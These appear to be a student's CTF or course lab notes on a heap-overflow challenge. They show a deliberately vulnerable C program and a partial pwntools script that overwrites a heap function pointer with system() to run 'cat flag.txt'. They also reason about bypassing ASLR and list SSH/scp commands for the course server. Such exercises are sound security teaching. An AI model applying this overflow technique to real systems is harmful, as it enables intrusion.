```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

struct script_manager {
	int valid_script;
	int (*fp)(const char *);
};

int env_scan() {
	int code;
	FILE* f;
	f = fopen("./flag.txt", "r");
	fread(&code, sizeof(int), 1, f);
	fclose(f);
	return code;

}


int main(int argc, char **argv) {
	char *d;
	struct script_manager *f;

	d = malloc(32);
	f = malloc(sizeof(struct script_manager));
	f->fp = puts;
	f->valid_script = env_scan();

	memcpy(d, argv[1], strlen(argv[1]));

	if(f->valid_script == env_scan()) {
		f->fp(d);
	}

}
```
- `memcpy()` copies argument into the 
- We do not have an opportunity to overflow the stack
- Are things adjacent in the heap
	- probably not
	- `int valid_script env_scan()` acts like a canary
	- prevents an overflow of the heap, requires a memory leak

### Heap Behavior when Malloc is called
- Where are d and f relative to eachother on the heap?
- gdb, they are about 0x30(48) away from eachother
	- d is size 48, so they are adjacent
- GEF command
	- `heap chunks` - allows you to look at allocated heap chunks

```python

exploit_str = b'a'*48
p.process(["./heap0", exploit_str])

p.recvall()
p.wait()

#after the flag is leaked
canary = b'LLLL'
addr_system = 0x0 #put real addr of system here
exploit_str = flat({0: b'cat flag.txt;'
					48: canary, 
					48+8: p64(addr_system)[:6]})# grab first six bytes ignore last two

```
- "heap canary" is just the first four bytes of the flag
	- in example, it will be 'LLLL'
	- will stay the same every time!
- one of the bytes in the system address could be interpreted as a backtick

### With ASLR
- overwrite system address bytes one at a time
- see what the addresses look like for multiple runs
- three least significant nibbles will be the same
- most significant byte will be the same
```
System
0x7f 4dcbc7 1d60
0x7f 397f14 9d60
0x7f b23e1d 3420
0x7f 4304b6 e420

Puts
0x7f 4dcbca 1ed0
0x7f 397f17 9ed0
0x7f b23e20 4970
0x7f 4304b9 f970
```
**Why does ASLR always end in 3 zeros**
- page allignment
- libc needs to start where a page starts

### Move binary to ssh server

```bash
# Generate the key pair for username bro 
ssh-keygen -t rsa -f ./kcjesse_ssh_key -C kcjesse -b 2048 
# Install the public key on the server 
ssh-copy-id -i kcjesse_ssh_key.pub kcjesse@cs4401shell2.walls.ninja 
# Test to make sure the public key was created correctly 
ssh -i ../keys/kcjesse_ssh_key kcjesse@cs4401shell2.walls.ninja

ssh kcjesse@cs4401shell2.walls.ninja
```

send file
`scp -i ../keys/kcjesse_ssh_key heap0.py kcjesse@cs4401shell2.walls.ninja:/home/kcjesse`

recvfile
`scp -i ../keys/kcjesse_ssh_key kcjesse@cs4401shell2.walls.ninja:/home/kcjesse/out.txt /root/host-share/CS4401/heap0`

`scp -i ../keys/kcjesse_ssh_key kcjesse@cs4401shell2.walls.ninja:/home/kcjesse/out.txt /Users/katherinejesse/CS4401/heap0`

`scp -i ../keys/kcjesse_ssh_key kcjesse@cs4401shell2.walls.ninja:/home/kcjesse/out.txt /root/host-share/CS4401/heap0`